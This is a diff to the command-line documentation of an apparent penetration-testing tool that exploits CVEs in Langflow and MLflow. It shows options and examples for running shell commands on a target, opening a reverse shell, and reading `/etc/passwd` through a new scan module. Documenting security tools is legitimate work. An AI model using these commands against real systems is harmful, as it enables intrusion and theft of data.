@@ -1,6 +1,6 @@
 # CLI Overview
 
-FlowHound exposes a single entry point, `flowhound`, with two sub-commands: [`attack`](attack.md) and [`sniff`](sniff.md).
+FlowHound exposes a single entry point, `flowhound`, with three sub-commands: [`attack`](attack.md), [`scan`](scan.md), and [`sniff`](sniff.md).
 
 ```
 flowhound [OPTIONS] COMMAND [ARGS]...
@@ -38,13 +38,33 @@ flowhound attack --url <URL> [OPTIONS]
 | `--command` | No | string | Shell command to run on the target via the `execute_bash_command` payload |
 | `--reverse_shell` | No | `LHOST:LPORT` | Reverse TCP shell payload target (e.g. `192.168.1.10:4444`) |
 | `--application` | No | string | Target application name (`langflow` or `mlflow`). Skips auto-detection when provided |
-| `--cve` | No | string | Limit execution to a single CVE (e.g. `CVE-2023-1177`) |
+| `--cve` | No | string | Limit execution to a single CVE (e.g. `CVE-2026-9198`) |
 | `-h`, `--help` | No | — | Show help text and exit |
 
 **Constraints:**
 
 - `--command` and `--reverse_shell` are mutually exclusive.
 - `--username` and `--password` must always be supplied together.
+
+---
+
+### `scan`
+
+Launch an auxiliary module against a target instance.
+
+```
+flowhound scan --url <URL> --cve <CVE> [OPTIONS]
+```
+
+| Option | Required | Type | Description |
+|---|---|---|---|
+| `--url` | Yes | URL | URL of the target instance |
+| `--cve` | Yes | string | Target auxiliary CVE identifier (e.g. `CVE-2023-1177`) |
+| `--f_path` | No | string | File path to read from (e.g. `/etc/passwd`) |
+| `--username` | No | string | Target username — must be paired with `--password` |
+| `--password` | No | string | Target password — must be paired with `--username` |
+| `--proxy` | No | URL | HTTP(S) proxy to route all traffic through |
+| `-h`, `--help` | No | — | Show help text and exit |
 
 ---
 
@@ -120,11 +140,14 @@ flowhound attack --url http://target.example.com:7860 --reverse_shell 192.168.1.
 # Route traffic through Burp Suite
 flowhound attack --url http://target.example.com:7860 --proxy http://127.0.0.1:8080
 
-# Target MLflow directly (skip auto-detection)
-flowhound attack --url http://target.example.com:5000 --application mlflow
+# Target Langflow directly (skip auto-detection)
+flowhound attack --url http://target.example.com:7860 --application langflow
 
-# Target a single CVE
-flowhound attack --url http://target.example.com:5000 --cve CVE-2023-1177
+# Target a single exploit CVE
+flowhound attack --url http://target.example.com:7860 --cve CVE-2026-9198
+
+# Run an auxiliary scan module
+flowhound scan --url http://target.example.com:5000 --cve CVE-2023-1177 --f_path /etc/passwd
 
 # Version detection only
 flowhound sniff --url http://target.example.com:7860
